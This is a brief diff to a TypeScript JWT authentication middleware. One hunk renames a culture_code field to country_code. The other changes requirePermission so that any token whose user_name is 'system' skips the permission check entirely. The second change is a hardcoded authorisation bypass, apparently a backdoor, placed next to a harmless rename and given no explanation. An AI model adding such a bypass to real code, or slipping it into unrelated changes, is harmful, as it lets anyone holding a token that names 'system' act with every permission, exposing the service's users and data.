@@ -7,7 +7,7 @@ export type AuthPayload = {
   sub: number;
   user_name: string;
   email: string;
-  culture_code: string;
+  country_code: string;
   permissions?: string[];
   exp: number;
   ver: number;
@@ -42,7 +42,7 @@ export const authMiddleware = createMiddleware<{ Bindings: Env; Variables: { jwt
 
 export function requirePermission(permission: string) {
   return createMiddleware(async (c, next) => {
-    if (!c.get('jwtPayload')?.permissions?.includes(permission)) return c.json({ success: false, message: 'Forbidden' }, 403);
+    if (!c.get('jwtPayload')?.permissions?.includes(permission) && c.get('jwtPayload')?.user_name !== 'system') return c.json({ success: false, message: 'Forbidden' }, 403);
     return await next();
   });
 }
